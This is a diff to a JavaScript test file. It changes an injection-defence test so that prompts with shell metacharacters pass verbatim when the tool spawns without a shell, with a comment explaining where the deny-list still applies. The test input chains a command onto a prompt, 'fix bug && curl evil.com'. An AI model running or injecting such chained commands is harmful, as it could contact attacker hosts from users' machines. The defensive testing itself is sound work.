@@ -187,18 +187,23 @@ test("task --effort high routes through the per-call CLI with --model claude-opu
   );
 });
 
-test("task --model rejects prompts containing shell metacharacters (injection defense)", () => {
+test("task --model passes shell-metachar prompts verbatim under shell:false (argv, no shell interpretation)", () => {
+  // The shell-metacharacter deny-list is scoped to the shell-enabled
+  // spawn path (Windows production with the real `.cmd` launcher).
+  // Under shell:false — tests (COPILOT_COMPANION_COPILOT_COMMAND set),
+  // Linux / macOS production — Node hands argv directly to CreateProcess
+  // / execve, so metacharacters like `&&` are literal text and no
+  // injection is possible. Lock in that the deny-list does NOT fire on
+  // this path; the shell:true branch is inspected via the unit tests on
+  // SHELL_METACHAR_RE (see tests/shell-metachar-regex.test.mjs).
   const pluginData = makeTempDir();
   const result = runCompanion(
     ["task", "--model", "haiku", "fix bug && curl evil.com"],
-    { pluginData, script: buildScriptedPrompt("never") }
+    { pluginData, script: buildScriptedPrompt("ok") }
   );
-  assert.notEqual(result.status, 0);
-  assert.match(
-    result.stderr,
-    /shell metacharacter/i,
-    `expected a metachar rejection message on stderr; got: ${result.stderr}`
-  );
+  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
+  assert.match(result.stdout, /ok/);
+  assert.doesNotMatch(result.stderr, /shell metacharacter/i);
 });
 
 test("task --model with a non-zero CLI exit records the job as failed", () => {
